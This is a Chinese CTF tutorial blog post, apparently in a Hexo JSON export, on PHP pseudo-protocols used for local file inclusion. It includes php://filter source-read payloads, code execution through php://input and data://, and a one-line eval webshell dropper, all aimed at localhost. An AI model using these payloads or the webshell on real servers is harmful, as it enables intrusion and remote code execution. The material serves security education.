![图片描述](https://segmentfault.com/img/bVbrQBP)\n\n## `phar://` 协议\n\n`phar://`协议与`zip://`类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：\n\n```\nhttp://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\n```\n\n![图片描述](https://segmentfault.com/img/bVbrQBX)\n\n另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。\n\n因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。\n\n参考文章：[seebug - 利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)\n\n","slug":"2020-11-08-PHP伪协议","published":1,"updated":"2020-11-20T02:13:11.834Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jn000sxov76ftkhpiu","content":"<h1 id=\"PHP伪协议\"><a href=\"#PHP伪协议\" class=\"headerlink\" title=\"PHP伪协议\"></a>PHP伪协议</h1><h2 id=\"file-协议\"><a href=\"#file-协议\" class=\"headerlink\" title=\"file:// 协议\"></a><code>file://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:off/on</li>\n<li><code>allow_url_include</code> :off/on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>\n</li>\n<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p>\n</li>\n<li><p><strong>用法</strong>：</p>\n<pre><code>/path/to/file.ext\nrelative/path/to/file.ext\nfileInCwd.ext\nC:/path/to/winfile.ext\nC:\\path\\to\\winfile.ext\n\\\\smbserver\\share\\path\\to\\winfile.ext\nfile:///path/to/file.ext</code></pre></li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>file://[文件的绝对路径和文件名]</code></p>\n<pre><code>http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQAZ\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>[文件的相对路径和文件名]</code></p>\n<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQA1\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>[http：//网络路径和文件名]</code></p>\n<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBb\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n<li><p><strong>参考</strong>：<a href=\"http://php.net/manual/zh/wrappers.file.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/wrappers.file.php</a></p>\n</li>\n</ul>\n<h2 id=\"php-协议\"><a href=\"#php-协议\" class=\"headerlink\" title=\"php:// 协议\"></a><code>php://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:off/on</li>\n<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>\n</li>\n<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>php://input</td>\n<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=\"multipart/form-data\"</code> 的时候<code>php://input</code>是无效的。</td>\n</tr>\n<tr>\n<td>php://output</td>\n<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>\n</tr>\n<tr>\n<td>php://fd</td>\n<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>\n</tr>\n<tr>\n<td>php://memory php://temp</td>\n<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>\n</tr>\n<tr>\n<td>php://filter</td>\n<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>\n</tr>\n</tbody></table>\n</li>\n<li><p><strong><code>php://filter</code>参数详解</strong></p>\n<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>\n<table>\n<thead>\n<tr>\n<th>php://filter 参数</th>\n<th>描述</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>resource=&lt;要过滤的数据流&gt;</td>\n<td>必须项。它指定了你要筛选过滤的数据流。</td>\n<td></td>\n</tr>\n<tr>\n<td>read=&lt;读链的过滤器&gt;</td>\n<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\\</td>\n<td>*）分隔。</td>\n</tr>\n<tr>\n<td>write=&lt;写链的过滤器&gt;</td>\n<td>可选项。可以设定一个或多个过滤器名称，以管道符（\\</td>\n<td>）分隔。</td>\n</tr>\n<tr>\n<td>&lt;; 两个链的过滤器&gt;</td>\n<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>\n<td></td>\n</tr>\n</tbody></table>\n</li>\n<li><p><strong>可用的过滤器列表（4类）</strong></p>\n<p>此处列举主要的过滤器类型，详细内容请参考：<a href=\"https://www.php.net/manual/zh/filters.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/filters.php</a></p>\n<table>\n<thead>\n<tr>\n<th>字符串过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>string.rot13</td>\n<td>等同于<code>str_rot13()</code>，rot13变换</td>\n</tr>\n<tr>\n<td>string.toupper</td>\n<td>等同于<code>strtoupper()</code>，转大写字母</td>\n</tr>\n<tr>\n<td>string.tolower</td>\n<td>等同于<code>strtolower()</code>，转小写字母</td>\n</tr>\n<tr>\n<td>string.strip_tags</td>\n<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>转换过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>convert.base64-encode &amp; convert.base64-decode</td>\n<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>\n</tr>\n<tr>\n<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>\n<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>压缩过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>zlib.deflate &amp; zlib.inflate</td>\n<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>\n</tr>\n<tr>\n<td>bzip2.compress &amp; bzip2.decompress</td>\n<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>加密过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mcrypt.*</td>\n<td>libmcrypt 对称加密算法</td>\n</tr>\n<tr>\n<td>mdecrypt.*</td>\n<td>libmcrypt 对称解密算法</td>\n</tr>\n</tbody></table>\n</li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>\n<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBf\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>php://input + [POST DATA]</code>执行php代码</p>\n<pre><code>http://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php phpinfo(); ?&gt;</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBh\" alt=\"图片描述\"></p>\n<p>若有写入权限，写入一句话木马</p>\n<pre><code>http://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBi\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n<li><p><strong>参考</strong>：<a href=\"https://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">https://php.net/manual/zh/wrappers.php.php</a></p>\n</li>\n</ul>\n<h2 id=\"zip-amp-bzip2-amp-zlib-协议\"><a href=\"#zip-amp-bzip2-amp-zlib-协议\" class=\"headerlink\" title=\"zip:// &amp; bzip2:// &amp; zlib:// 协议\"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:off/on</li>\n<li><code>allow_url_include</code> :off/on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>\n</li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>\n<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>\n<pre><code>http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBj\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>compress.bzip2://file.bz2</code></p>\n<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>\n<pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBt\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>compress.zlib://file.gz</code></p>\n<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>\n<pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBu\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n<li><p><strong>参考</strong>：<a href=\"http://php.net/manual/zh/wrappers.compression.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/wrappers.compression.php</a></p>\n</li>\n</ul>\n<h2 id=\"data-协议\"><a href=\"#data-协议\" class=\"headerlink\" title=\"data:// 协议\"></a><code>data://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:on</li>\n<li><code>allow_url_include</code> :on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>\n</li>\n<li><p><strong>用法</strong>：</p>\n<pre><code>data://text/plain,\ndata://text/plain;base64,</code></pre></li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>data://text/plain,</code></p>\n<pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBB\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>data://text/plain;base64,</code></p>\n<pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBD\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"http-amp-https-协议\"><a href=\"#http-amp-https-协议\" class=\"headerlink\" title=\"http:// &amp; https:// 协议\"></a><code>http:// &amp; https://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:on</li>\n<li><code>allow_url_include</code> :on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>\n</li>\n<li><p><strong>用法</strong>：</p>\n<pre><code>http://example.com\nhttp://example.com/file.php?var1=val1&amp;var2=val2\nhttp://user:password@example.com\nhttps://example.com\nhttps://example.com/file.php?var1=val1&amp;var2=val2\nhttps://user:password@example.com</code></pre></li>\n<li><p><strong>示例</strong>：</p>\n<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBP\" alt=\"图片描述\"></p>\n</li>\n</ul>\n<h2 id=\"phar-协议\"><a href=\"#phar-协议\" class=\"headerlink\" title=\"phar:// 协议\"></a><code>phar://</code> 协议</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>\n<pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBX\" alt=\"图片描述\"></p>\n<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p>\n<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>\n<p>参考文章：<a href=\"https://paper.seebug.org/680/\" target=\"_blank\" rel=\"noopener\">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"PHP伪协议\"><a href=\"#PHP伪协议\" class=\"headerlink\" title=\"PHP伪协议\"></a>PHP伪协议</h1><h2 id=\"file-协议\"><a href=\"#file-协议\" class=\"headerlink\" title=\"file:// 协议\"></a><code>file://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:off/on</li>\n<li><code>allow_url_include</code> :off/on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>\n</li>\n<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p>\n</li>\n<li><p><strong>用法</strong>：</p>\n<pre><code>/path/to/file.ext\nrelative/path/to/file.ext\nfileInCwd.ext\nC:/path/to/winfile.ext\nC:\\path\\to\\winfile.ext\n\\\\smbserver\\share\\path\\to\\winfile.ext\nfile:///path/to/file.ext</code></pre></li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>file://[文件的绝对路径和文件名]</code></p>\n<pre><code>http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQAZ\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>[文件的相对路径和文件名]</code></p>\n<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQA1\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>[http：//网络路径和文件名]</code></p>\n<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBb\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n<li><p><strong>参考</strong>：<a href=\"http://php.net/manual/zh/wrappers.file.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/wrappers.file.php</a></p>\n</li>\n</ul>\n<h2 id=\"php-协议\"><a href=\"#php-协议\" class=\"headerlink\" title=\"php:// 协议\"></a><code>php://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:off/on</li>\n<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>\n</li>\n<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>php://input</td>\n<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td>\n</tr>\n<tr>\n<td>php://output</td>\n<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>\n</tr>\n<tr>\n<td>php://fd</td>\n<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>\n</tr>\n<tr>\n<td>php://memory php://temp</td>\n<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>\n</tr>\n<tr>\n<td>php://filter</td>\n<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>\n</tr>\n</tbody></table>\n</li>\n<li><p><strong><code>php://filter</code>参数详解</strong></p>\n<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>\n<table>\n<thead>\n<tr>\n<th>php://filter 参数</th>\n<th>描述</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>resource=&lt;要过滤的数据流&gt;</td>\n<td>必须项。它指定了你要筛选过滤的数据流。</td>\n<td></td>\n</tr>\n<tr>\n<td>read=&lt;读链的过滤器&gt;</td>\n<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\\</td>\n<td>*）分隔。</td>\n</tr>\n<tr>\n<td>write=&lt;写链的过滤器&gt;</td>\n<td>可选项。可以设定一个或多个过滤器名称，以管道符（\\</td>\n<td>）分隔。</td>\n</tr>\n<tr>\n<td>&lt;; 两个链的过滤器&gt;</td>\n<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>\n<td></td>\n</tr>\n</tbody></table>\n</li>\n<li><p><strong>可用的过滤器列表（4类）</strong></p>\n<p>此处列举主要的过滤器类型，详细内容请参考：<a href=\"https://www.php.net/manual/zh/filters.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/filters.php</a></p>\n<table>\n<thead>\n<tr>\n<th>字符串过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>string.rot13</td>\n<td>等同于<code>str_rot13()</code>，rot13变换</td>\n</tr>\n<tr>\n<td>string.toupper</td>\n<td>等同于<code>strtoupper()</code>，转大写字母</td>\n</tr>\n<tr>\n<td>string.tolower</td>\n<td>等同于<code>strtolower()</code>，转小写字母</td>\n</tr>\n<tr>\n<td>string.strip_tags</td>\n<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>转换过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>convert.base64-encode &amp; convert.base64-decode</td>\n<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>\n</tr>\n<tr>\n<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>\n<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>压缩过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>zlib.deflate &amp; zlib.inflate</td>\n<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>\n</tr>\n<tr>\n<td>bzip2.compress &amp; bzip2.decompress</td>\n<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>加密过滤器</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mcrypt.*</td>\n<td>libmcrypt 对称加密算法</td>\n</tr>\n<tr>\n<td>mdecrypt.*</td>\n<td>libmcrypt 对称解密算法</td>\n</tr>\n</tbody></table>\n</li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>\n<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBf\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>php://input + [POST DATA]</code>执行php代码</p>\n<pre><code>http://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php phpinfo(); ?&gt;</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBh\" alt=\"图片描述\"></p>\n<p>若有写入权限，写入一句话木马</p>\n<pre><code>http://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBi\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n<li><p><strong>参考</strong>：<a href=\"https://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">https://php.net/manual/zh/wrappers.php.php</a></p>\n</li>\n</ul>\n<h2 id=\"zip-amp-bzip2-amp-zlib-协议\"><a href=\"#zip-amp-bzip2-amp-zlib-协议\" class=\"headerlink\" title=\"zip:// &amp; bzip2:// &amp; zlib:// 协议\"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:off/on</li>\n<li><code>allow_url_include</code> :off/on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>\n</li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>\n<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>\n<pre><code>http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBj\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>compress.bzip2://file.bz2</code></p>\n<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>\n<pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBt\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>compress.zlib://file.gz</code></p>\n<p>压缩 phpinfo.txt 为 phpinfo.gz 